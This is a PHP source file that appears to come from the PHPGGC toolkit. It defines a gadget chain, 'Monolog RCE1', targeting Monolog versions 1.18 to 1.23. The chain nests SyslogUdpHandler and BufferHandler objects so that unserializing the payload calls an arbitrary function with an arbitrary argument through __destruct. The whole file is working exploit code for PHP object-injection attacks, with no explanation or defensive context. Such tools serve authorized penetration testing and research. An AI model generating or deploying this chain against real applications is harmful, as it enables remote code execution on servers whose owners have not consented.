<?php

namespace GadgetChain\Monolog;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.18 <= 1.23';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', $function],
                [$parameter, 'level' => null]
            )
        );
    }
}